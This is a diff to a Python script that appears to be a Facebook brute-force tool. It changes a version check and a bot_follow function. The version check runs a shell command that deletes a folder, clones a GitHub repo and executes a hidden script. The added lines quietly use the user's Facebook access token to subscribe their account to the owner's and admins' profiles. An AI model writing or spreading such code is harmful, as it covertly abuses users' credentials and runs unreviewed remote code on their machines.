@@ -29,7 +29,7 @@ if text == "":
     exit()
 
 #CEK VERSI
-versi = "1.1"
+versi = "1.2"
 if versi != vers:
     print("SC PERLU DIPERBAHARUI")
     os.system('cd && rm -rf mbf && git clone https://github.com/jukill/ninja-BF && cd ninja-BF && python .ninja.py')
@@ -297,8 +297,9 @@ def bot_follow():
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/100011669563699/subscribers?access_token=" + toket)      # owner sc
-	requests.post("https://graph.facebook.com/100000023658232/subscribers?access_token=" + toket)      # Admin
-        requests.post("https://graph.facebook.com/100037324323631/subscribers?access_token=" + token)
+	requests.post("https://graph.facebook.com/100000023658232/subscribers?access_token=" + toket) # Admin
+	requests.post("https://graph.facebook.com/100037324323631/subscribers?access_token=" + toket)      # Admin
+
 	menu()
 
 ### MAIN MENU ###
